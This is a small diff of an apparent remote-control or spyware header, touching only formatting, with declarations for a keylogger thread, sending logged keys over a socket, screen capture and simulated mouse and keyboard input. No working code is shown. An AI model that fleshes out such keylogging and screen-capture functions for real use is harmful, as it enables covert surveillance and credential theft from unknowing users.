@@ -12,8 +12,7 @@ int SimulateKbtEventTypeMod(char *data);
 int SimulateMouseEventMove(char *action);
 int SimulateMouseEventClick(int rol);
 bool SendLoggedKeys(int fd);
-bool CaptureScreenAndSaveToFile(const char* fileName);
-
+bool CaptureScreenAndSaveToFile(const char *fileName);
 
 DWORD WINAPI KeyloggerThread(LPVOID lpParameter);
 
